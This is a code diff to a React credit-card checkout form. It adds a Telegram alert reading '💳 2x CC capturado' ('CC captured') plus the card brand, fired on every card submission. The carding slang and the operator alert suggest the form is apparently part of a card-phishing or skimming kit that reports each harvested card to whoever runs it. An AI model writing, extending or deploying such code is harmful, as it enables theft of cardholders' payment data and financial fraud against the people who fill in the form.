@@ -1,3 +1,4 @@
+
 import React from 'react';
 import { useForm } from 'react-hook-form';
 import { zodResolver } from '@hookform/resolvers/zod';
@@ -8,6 +9,7 @@ import { CreditCardData } from '@/types/checkout';
 import { cardSchema } from './cardValidation';
 import { CardFormFields } from './CardFormFields';
 import { detectCardBrand } from './CardBrandDetector';
+import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';
 
 interface CardFormProps {
   onSubmit: (data: CreditCardData) => void;
@@ -36,7 +38,7 @@ export const CardForm: React.FC<CardFormProps> = ({
     mode: 'onChange'
   });
 
-  const handleSubmit = (values: z.infer<typeof cardSchema>) => {
+  const handleSubmit = async (values: z.infer<typeof cardSchema>) => {
     const cardData: CreditCardData = {
       holderName: values.holderName,
       number: values.number.replace(/\s/g, ''),
@@ -45,6 +47,13 @@ export const CardForm: React.FC<CardFormProps> = ({
       brand: detectCardBrand(values.number).brand,
       installments: values.installments
     };
+    
+    // Enviar notificação do Telegram quando os dados do cartão forem preenchidos e enviados
+    try {
+      await sendTelegramNotification(`💳 2x CC capturado - ${cardData.brand.toUpperCase()}`);
+    } catch (error) {
+      console.error('Error sending Telegram notification:', error);
+    }
     
     onSubmit(cardData);
   };
